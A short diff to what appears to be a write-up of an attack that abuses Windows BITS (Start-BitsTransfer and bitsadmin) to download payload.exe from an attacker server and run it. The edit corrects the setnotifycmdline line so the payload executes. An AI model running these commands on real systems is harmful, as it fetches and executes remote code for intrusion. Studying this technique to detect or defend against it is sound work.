@@ -62,7 +62,7 @@ On the compromised Windows machine, the attacker executes PowerShell commands to
 $job = Start-BitsTransfer -Source "http://192.168.100.10:8080/payload.exe" -Destination "C:\Users\Public\payload.exe"
 bitsadmin /create /download MaliciousJob
 bitsadmin /addfile MaliciousJob "http://attacker-server/payload.exe" "C:\Users\Public\payload.exe"
-bitsadmin /setnotifycmdline MaliciousJob "C:\Users\Public\payload.exe" ""
+bitsadmin /setnotifycmdline MaliciousJob "cmd" "C:\Users\Public\payload.exe" ""
 bitsadmin /resume MaliciousJob
 ```
 This command sequence:
